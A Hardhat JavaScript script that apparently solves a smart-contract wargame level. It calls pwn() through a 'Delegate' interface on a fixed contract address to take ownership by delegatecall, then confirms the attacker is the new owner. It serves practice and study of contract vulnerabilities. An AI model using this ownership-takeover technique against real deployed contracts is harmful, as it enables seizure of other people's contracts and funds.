const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x31E573D3294b7065eD35dECba93152a8f0d28AeF"
    let target = await ethers.getContractAt("Delegate", instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Attack
    tx = await target.pwn({ gasLimit: 35000 })
    await tx.wait(1)

    // Check
    owner = await target.owner()
    if (owner == attacker.address) {
        console.log(`${symbols.success} Owned Contract`)
    } else {
        console.log(`${symbols.error} Contract owner is ${owner}!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
